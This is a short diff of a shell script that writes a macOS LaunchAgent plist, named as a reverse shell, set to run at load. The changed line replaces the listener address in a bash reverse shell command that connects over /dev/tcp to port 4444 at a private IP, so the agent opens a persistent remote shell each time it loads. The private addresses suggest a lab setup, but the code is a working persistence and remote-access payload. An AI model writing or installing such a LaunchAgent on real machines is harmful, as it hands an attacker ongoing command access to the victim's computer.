@@ -14,7 +14,7 @@ cat <<'PLIST' > ~/Library/LaunchAgents/com.reverse.shell.plist
   <array>
     <string>/bin/bash</string>
     <string>-c</string>
-    <string>bash -i >& /dev/tcp/192.168.64.9/4444 0>&1</string>
+    <string>bash -i >& /dev/tcp/10.120.1.201/4444 0>&1</string>
   </array>
 
   <key>RunAtLoad</key>
